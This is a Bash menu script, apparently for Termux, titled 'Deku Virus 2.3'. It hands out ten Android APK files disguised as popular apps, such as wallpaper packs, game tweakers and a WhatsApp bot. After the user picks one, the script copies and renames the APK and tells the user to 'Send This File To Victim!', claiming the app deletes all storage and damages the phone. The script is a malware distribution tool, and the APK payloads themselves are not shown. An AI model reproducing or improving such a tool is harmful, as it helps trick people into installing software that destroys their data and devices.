#!/bin/bash
clear
echo -e "\e[1m\e[35m¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥\e[21m"
echo -e "\e[31m"
figlet "Deku"
figlet "Virus 2.3"
echo -e "\e[31m"
echo -e "\e[1m\e[35m¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥\e[21m"
echo " "
echo -e "\e[31m VIRUS APPLICATIONS ( New 2021 ! ) "|pv -qL 20
echo -e "\e[96m___________________________________"
echo " "
sleep 1
echo -e "\e[91m[1]\e[35m Nature HD Wallpapers"
echo -e "\e[91m[2]\e[35m Termux Pro "
echo -e "\e[91m[3]\e[35m FF Lag Fixer "
echo -e "\e[91m[4]\e[35m Text Now Pro "
echo -e "\e[91m[5]\e[35m Insta Follow & Like "
echo -e "\e[91m[6]\e[35m PUBG GFX Tool"
echo -e "\e[91m[7]\e[35m Settings Pro "
echo -e "\e[91m[8]\e[35m Play Store Pro"
echo -e "\e[91m[9]\e[35m FF Diamond File"
echo -e "\e[91m[10]\e[35m Auto BOT For Whatsapp"
echo " "
echo -e "\e[31m •<<< When Anyone Install These Application  "
echo -e "\e[31m Their Phone Will Be Damaged ! >>>•" 
echo -e "\e[36m "
read -p "CHOOSSE AN OPTION : " optionapp
echo " "

function process_app() {
  local filename="$1"
  echo -e "\e[32m~Downloading \"$filename\" Virus Application "|pv -qL 20
  sleep 1
  echo -e "\e[94m"
  cd files
  cp "$filename." ..
  cd ..
  mv "$filename." "$filename.apk"
  echo "••••••••••••••••••100%"|pv -qL 10
  echo " "
  sleep 1
  echo -e "\e[92m$filename.apk File Downloaded Successfully"
  echo " "
  sleep 1
  echo -e "\e[96mNow Type :- cp $filename.apk /sdcard "
  echo -e "\e[96mTo COPY The Tvirus App File To "
  echo -e "\e[96mYour INTERNAL STORAGE "
  echo -e "\e[96mWhen Anyone Install This Application"
  echo -e "\e[96mTheir Phone Will Be Damaged !"
  echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
  echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
  echo -e "\e[96mSend This File To Victim!"
}

case "$optionapp" in
  1) process_app "Nature_hd_walpapers";;
  2) process_app "Termux_pro";;
  3) process_app "Ff_lag_fixer";;
  4) process_app "Text_now_pro";;
  5) process_app "Insta_f_and_l";;
  6) process_app "Pubg_gfx_tool";;
  7) process_app "Settings_pro";;
  8) process_app "Play_store_pro";;
  9) process_app "Ff_diamond_file";;
 10) process_app "Auto_bot_for_whatsapp";;
 *)
    echo " "
    echo -e "\e[95m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
    echo "•••Sorry Please choose Correct OPTION•••"
    echo -e "\e[95m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
    ;;
esac

echo " "
echo -e "\e[92m========================================== "
echo -e "\e[93m[1] To Go Back"
echo -e "\e[93m[2] To Go Home"
echo -e "\e[93m[3] To Exit "
echo -e "\e[92m "
read -p "CHOOSE AN OPTION : " be 
if [ "$be" -eq 1 ]; then
  bash "$0"
elif [ "$be" -eq 2 ]; then
  bash DekuVirus.sh
fi

echo -e "\e[95m÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷"
echo -e "\e[103m     •••FOR MORE DETAILS•••. "
echo -e "\e[103mSEARCH *The Deku Virus*"
echo -e "\e[103m       •••ON YOUTUBE•••      \e[49m"
